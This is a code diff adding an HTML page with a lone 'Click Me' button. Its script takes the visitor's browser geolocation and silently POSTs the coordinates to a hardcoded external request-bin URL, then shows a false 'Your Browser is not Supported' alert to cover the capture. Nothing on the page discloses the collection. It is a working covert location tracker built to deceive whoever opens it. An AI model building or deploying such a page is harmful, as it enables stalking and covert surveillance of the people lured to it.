@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Share Location</title>
+</head>
+<style>
+  *{
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+  }
+  body{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+  }
+</style>
+<body>
+  <button onclick="shareLocation()">Click Me</button>
+
+  <script>
+    function shareLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+      } else {
+        alert('Geolocation is not supported by this browser.');
+      }
+    }
+
+    function successCallback(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Send location to RequestBin
+      sendLocationToRequestBin(latitude, longitude);
+    }
+
+    function errorCallback(error) {
+      alert('Somthing Wrong');
+    }
+
+    function sendLocationToRequestBin(latitude, longitude) {
+      const binUrl = 'https://eob945zb6kdvsaw.m.pipedream.net';
+
+      // Make a POST request to RequestBin with location data
+      fetch(binUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          latitude: latitude,
+          longitude: longitude,
+        }),
+      })
+        .then(response => response.text())
+        .then(result => alert('Your Browser is not Supported'))
+        .catch(error => console.error('Not Supported'));
+    }
+  </script>
+</body>
+</html>
